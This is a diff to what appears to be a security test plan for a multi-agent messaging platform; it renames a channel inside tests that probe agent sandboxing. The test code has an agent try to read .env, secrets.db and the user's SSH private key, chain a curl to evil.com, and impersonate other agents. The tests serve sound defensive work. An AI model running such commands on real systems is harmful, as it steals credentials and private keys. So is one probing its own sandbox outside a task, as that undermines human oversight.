@@ -154,7 +154,7 @@ Now try to break it. Work through each category systematically. Document every f
 
 | Test | How | Expected Result |
 |------|-----|-----------------|
-| Post as different agent | `curl -X POST localhost:3001/api/messages -H "X-API-Key: <agent_assistant_key>" -d '{"channel_id":"chan_command","body":"test","from_user":"agent_security"}'` | Should be overridden to real identity |
+| Post as different agent | `curl -X POST localhost:3001/api/messages -H "X-API-Key: <agent_assistant_key>" -d '{"channel_id":"chan_coordination","body":"test","from_user":"agent_security"}'` | Should be overridden to real identity |
 | Post as human | Same as above but `from_user: "user_admin"` | Should be rejected or overridden |
 | Impersonation lockdown | Try multiple impersonation attempts | Should trigger lockdown |
 
@@ -188,49 +188,49 @@ module.exports = {
         // Test 1: Try to read .env
         try {
           const env = await tools.shell.exec('cat ../.env');
-          await darkhan.post('chan_command', `GOT ENV: ${env.stdout}`);
+          await darkhan.post('chan_coordination', `GOT ENV: ${env.stdout}`);
         } catch (e) {
-          await darkhan.post('chan_command', `ENV blocked: ${e.message}`);
+          await darkhan.post('chan_coordination', `ENV blocked: ${e.message}`);
         }
 
         // Test 2: Try to run python
         try {
           const py = await tools.shell.exec('python3 -c "print(1+1)"');
-          await darkhan.post('chan_command', `PYTHON WORKS: ${py.stdout}`);
+          await darkhan.post('chan_coordination', `PYTHON WORKS: ${py.stdout}`);
         } catch (e) {
-          await darkhan.post('chan_command', `Python blocked: ${e.message}`);
+          await darkhan.post('chan_coordination', `Python blocked: ${e.message}`);
         }
 
         // Test 3: Try to curl
         try {
           const curl = await tools.shell.exec('curl -s https://httpbin.org/ip');
-          await darkhan.post('chan_command', `CURL WORKS: ${curl.stdout}`);
+          await darkhan.post('chan_coordination', `CURL WORKS: ${curl.stdout}`);
         } catch (e) {
-          await darkhan.post('chan_command', `Curl blocked: ${e.message}`);
+          await darkhan.post('chan_coordination', `Curl blocked: ${e.message}`);
         }
 
         // Test 4: Try command chaining
         try {
           const chain = await tools.shell.exec('echo safe && curl https://evil.com');
-          await darkhan.post('chan_command', `CHAIN WORKS: ${chain.stdout}`);
+          await darkhan.post('chan_coordination', `CHAIN WORKS: ${chain.stdout}`);
         } catch (e) {
-          await darkhan.post('chan_command', `Chain blocked: ${e.message}`);
+          await darkhan.post('chan_coordination', `Chain blocked: ${e.message}`);
         }
 
         // Test 5: Try to read secrets.db
         try {
           const db = await tools.fs.read('../db/secrets.db');
-          await darkhan.post('chan_command', `GOT SECRETS: ${db.substring(0, 50)}`);
+          await darkhan.post('chan_coordination', `GOT SECRETS: ${db.substring(0, 50)}`);
         } catch (e) {
-          await darkhan.post('chan_command', `Secrets blocked: ${e.message}`);
+          await darkhan.post('chan_coordination', `Secrets blocked: ${e.message}`);
         }
 
         // Test 6: Try to read outside folio
         try {
           const ssh = await tools.fs.read('/Users/' + process.env.USER + '/.ssh/id_rsa');
-          await darkhan.post('chan_command', `GOT SSH KEY`);
+          await darkhan.post('chan_coordination', `GOT SSH KEY`);
         } catch (e) {
-          await darkhan.post('chan_command', `SSH blocked: ${e.message}`);
+          await darkhan.post('chan_coordination', `SSH blocked: ${e.message}`);
         }
 
         // Test 7: Excessive file reads (rate limiting)
@@ -238,9 +238,9 @@ module.exports = {
           for (let i = 0; i < 250; i++) {
             await tools.fs.read('../../README.md');
           }
-          await darkhan.post('chan_command', `250 READS SUCCEEDED (no rate limit)`);
+          await darkhan.post('chan_coordination', `250 READS SUCCEEDED (no rate limit)`);
         } catch (e) {
-          await darkhan.post('chan_command', `Rate limit hit: ${e.message}`);
+          await darkhan.post('chan_coordination', `Rate limit hit: ${e.message}`);
         }
       }
     }
